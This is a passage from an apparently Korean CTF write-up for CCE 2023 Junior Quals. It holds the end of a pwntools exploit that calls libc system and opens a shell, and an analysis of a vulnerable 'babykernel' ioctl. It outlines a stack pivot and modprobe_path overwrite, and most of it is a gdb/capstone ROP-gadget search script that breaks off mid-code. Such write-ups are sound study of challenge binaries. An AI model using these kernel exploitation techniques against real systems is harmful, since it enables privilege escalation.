</span></span><span style="display:flex;"><span>    sl(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    s(p64(libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
</span></span><span style="display:flex;"><span>    pause()
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img loading="lazy" src="/blog/CCE_2023_Junior_Quals/image-1.png" alt=""  />

<img loading="lazy" src="/blog/CCE_2023_Junior_Quals/image-2.png" alt=""  />
</p>
<h1 id="babykernel">babykernel<a hidden class="anchor" aria-hidden="true" href="#babykernel">#</a></h1>
<p>궁금해서 문제 파일을 받아서 풀어봤다.</p>
<h2 id="analysis-3">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-3">#</a></h2>
<h3 id="local_runsh-1">local_run.sh<a hidden class="anchor" aria-hidden="true" href="#local_runsh-1">#</a></h3>
<pre tabindex="0"><code>#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -cpu kvm64,+smep \
    -kernel bzImage \
    -initrd rootfs.img.gz \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34; \
    -s
</code></pre><p>smap가 안걸려있다.</p>
<h3 id="babykernelko">babykernel.ko<a hidden class="anchor" aria-hidden="true" href="#babykernelko">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>user_struct, args, <span style="color:#ae81ff">0x18LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> ( (_DWORD)cmd )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1002</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>ops <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>user_struct <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>      v6 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)<span style="color:#a6e22e">kmem_cache_alloc_trace</span>(kmalloc_caches[<span style="color:#ae81ff">18</span>], <span style="color:#ae81ff">0x6000C0LL</span>, <span style="color:#ae81ff">16LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>v6 <span style="color:#f92672">=</span> v5;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>user_struct <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_copy_overflow</span>(<span style="color:#ae81ff">16LL</span>, <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>user_struct <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">copy_to_user</span>(user_struct, v6);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1003</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      ((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>ops <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>user_struct <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>)))();<span style="color:#75715e">// relative ex
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x1001</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)<span style="color:#a6e22e">kmem_cache_alloc_trace</span>(kmalloc_caches[<span style="color:#ae81ff">18</span>], <span style="color:#ae81ff">0x6000C0LL</span>, <span style="color:#ae81ff">0x10LL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>v4 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>commit_creds;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>user_struct <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x10</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">copy_to_user</span>(user_struct, v4);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>0x1002, 0x1001은 릭해주고, 0x1003은 ops에서 특정 오프셋만큼 떨어진 부분을 실행한다.</p>
<h2 id="exploitation-3">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-3">#</a></h2>
<p>ops쪽이랑 코드쪽 매핑을 릭하고 피보팅해주고 modprobe_path를 덮었다.
bzImage를 vmlinux로 추출하려했는데, 안되길래 직접 rop gadgets을  찾는 스크립트를 작성해서 가젯을 잘 가져왔다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> capstone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> tqdm <span style="color:#f92672">import</span> tqdm
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>default <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../res.rop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brief</span>(x,keywords):
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffffffff</span>
</span></span><span style="display:flex;"><span>    M <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    Ml <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> keywords:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> m <span style="color:#f92672">&gt;</span> x<span style="color:#f92672">.</span>index(i):
</span></span><span style="display:flex;"><span>            m <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>index(i)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> M <span style="color:#f92672">&lt;</span> x<span style="color:#f92672">.</span>index(i):
</span></span><span style="display:flex;"><span>            M <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>index(i)
</span></span><span style="display:flex;"><span>            Ml <span style="color:#f92672">=</span> len(i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> m <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> M <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    s,S <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> M<span style="color:#f92672">+</span>Ml<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&gt;</span> len(x):
</span></span><span style="display:flex;"><span>        S <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> m<span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> s <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> S:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x[:M<span style="color:#f92672">+</span>Ml<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> s <span style="color:#f92672">and</span> S:
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> m
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> x[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
</span></span><span style="display:flex;"><span>                i<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            i<span style="color:#f92672">-=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x[i:]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> s <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> S:
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> m
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> x[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
</span></span><span style="display:flex;"><span>                i<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>            i<span style="color:#f92672">-=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x[i:M<span style="color:#f92672">+</span>Ml<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> x
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_int</span>(v):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> v<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;0x&#34;</span>):
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> int(v,<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> int(v,<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> v
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>(s,sv):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> sv:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;save? (y/n) : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> input() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> v: 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(default,<span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                pickle<span style="color:#f92672">.</span>dump(s, f)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;saved&#34;</span>)
</span></span><span style="display:flex;"><span>    print()
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Examples)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">1) array search :</span><span style="color:#ae81ff">\n\t\t</span><span style="color:#e6db74">Search &gt; [&#39;xchg&#39;,&#39;esp&#39;,&#39;ret&#39;]</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">2) string search :</span><span style="color:#ae81ff">\n\t\t</span><span style="color:#e6db74">Search &gt; xchg esp</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">3) quit :</span><span style="color:#ae81ff">\n\t\t</span><span style="color:#e6db74">Search &gt; q</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">4) Save results :</span><span style="color:#ae81ff">\n\t\t</span><span style="color:#e6db74">Search &gt; save&#34;</span>)
</span></span><span style="display:flex;"><span>    print()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Search &gt; &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> input()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> v <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;q&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> v<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;[&#39;</span>):
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;limit : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            limit <span style="color:#f92672">=</span> parse_int(input())
</span></span><span style="display:flex;"><span>            arr <span style="color:#f92672">=</span> eval(v)
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s:
</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                cur <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                idx <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> arr:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> j <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> i:
</span></span><span style="display:flex;"><span>                        f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> cur <span style="color:#f92672">&lt;</span> i<span style="color:#f92672">.</span>index(j):
</span></span><span style="display:flex;"><span>                            idx<span style="color:#f92672">.</span>append(i<span style="color:#f92672">.</span>index(j))
</span></span><span style="display:flex;"><span>                            cur <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>index(j)
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                            f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> f<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                    m <span style="color:#f92672">=</span> sum(idx) <span style="color:#f92672">/</span> len(idx)
</span></span><span style="display:flex;"><span>                    M <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                    t <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> idx:
</span></span><span style="display:flex;"><span>                        t <span style="color:#f92672">=</span> (m <span style="color:#f92672">-</span> k)<span style="color:#f92672">**</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> M <span style="color:#f92672">&lt;</span> t:
</span></span><span style="display:flex;"><span>                            M <span style="color:#f92672">=</span> t
</span></span><span style="display:flex;"><span>                    res<span style="color:#f92672">.</span>append([t,i])
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;show brief (y/n) : &#34;</span>,end<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            v <span style="color:#f92672">=</span> input() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>
</span></span><span style="display:flex;"><span>            res<span style="color:#f92672">.</span>sort()
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">&lt;</span> limit:
</span></span><span style="display:flex;"><span>                limit <span style="color:#f92672">=</span> len(res)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(limit):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> v:
</span></span><span style="display:flex;"><span>                    print()
</span></span><span style="display:flex;"><span>                    x<span style="color:#f92672">=</span> brief((res[i][<span style="color:#ae81ff">1</span>]),arr)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> x <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>                    print(x)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    print()
</span></span><span style="display:flex;"><span>                    print((res[i][<span style="color:#ae81ff">1</span>]))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;limit : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            limit <span style="color:#f92672">=</span> parse_int(input())
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> v <span style="color:#f92672">in</span> i:
</span></span><span style="display:flex;"><span>                    print(i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;load? (y/n) : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> input() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> v:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(default,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>load(f)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;loaded successfully&#34;</span>)
</span></span><span style="display:flex;"><span>            search(s,<span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39;</span><span style="color:#e6db74">{</span>default<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; not found&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        inf <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>inferiors()[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;segment address : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>        addr <span style="color:#f92672">=</span> parse_int(input())
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;xinfo </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,to_string<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Containing mapping:&#39;</span> <span style="color:#f92672">in</span> res:
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> res[res<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;0x&#39;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> res[res<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;0x&#39;</span>):]<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;reading memory </span><span style="color:#e6db74">{</span>res[<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> ~ </span><span style="color:#e6db74">{</span>res[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> (0x</span><span style="color:#e6db74">{</span>res[<span style="color:#ae81ff">3</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes)&#34;</span>)
</span></span><span style="display:flex;"><span>            mem <span style="color:#f92672">=</span> (inf<span style="color:#f92672">.</span>read_memory(int(res[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">16</span>),int(res[<span style="color:#ae81ff">3</span>],<span style="color:#ae81ff">16</span>)))<span style="color:#f92672">.</span>tobytes()
</span></span><span style="display:flex;"><span>            md <span style="color:#f92672">=</span> Cs(CS_ARCH_X86, CS_MODE_64)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e">#gadgets = [b&#39;\xc3&#39;,b&#34;\xc2&#34;,b&#39;\xcb&#39;,b&#34;\xca&#34;,b&#39;\xf2\xc3&#39;,b&#34;\xf2\xc2&#34;,b&#39;\xff&#39;,b&#39;\xeb&#39;,b&#39;\xe9&#39;,b&#39;\xf2\xff&#39;,b&#39;\xcd\x80&#39;,b&#34;\x0f\x34&#34;,b&#34;\x0f\x05&#34;,b&#39;\x65\xff\x15\x10\x00\x00\x00&#39;]</span>
</span></span><span style="display:flex;"><span>            gadgets <span style="color:#f92672">=</span> [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc2</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xcb</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xca</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xeb</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xe9</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xf2</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xcd</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0f</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x65</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x48</span><span style="color:#e6db74">&#39;</span>] <span style="color:#75715e"># iretq</span>
</span></span><span style="display:flex;"><span>            candi <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;finding gadgets&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(len(mem))):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> gadgets:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> mem[i] <span style="color:#f92672">==</span> k[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">and</span> i <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> candi:
</span></span><span style="display:flex;"><span>                        candi<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>            s <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>            base <span style="color:#f92672">=</span> int(res[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># print(&#34;width : &#34;,end=&#39;&#39;)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># v = parse_int(input())</span>
</span></span><span style="display:flex;"><span>            v <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span> <span style="color:#75715e"># width 0x20 by default</span>
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;disassembling&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> tqdm(range(len(candi))):
</span></span><span style="display:flex;"><span>                tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> j<span style="color:#f92672">-</span>v <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> md<span style="color:#f92672">.</span>disasm(mem[:candi[j]<span style="color:#f92672">+</span>v], base):
</span></span><span style="display:flex;"><span>                        tmp <span style="color:#f92672">+=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>(<span style="color:#e6db74">&#39;0x&#39;</span><span style="color:#f92672">+</span>hex(i<span style="color:#f92672">.</span>address)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">16</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; (+&#39;</span><span style="color:#f92672">+</span> hex(i<span style="color:#f92672">.</span>address<span style="color:#f92672">-</span>base)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;)&#39;</span>, i<span style="color:#f92672">.</span>mnemonic, i<span style="color:#f92672">.</span>op_str))
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
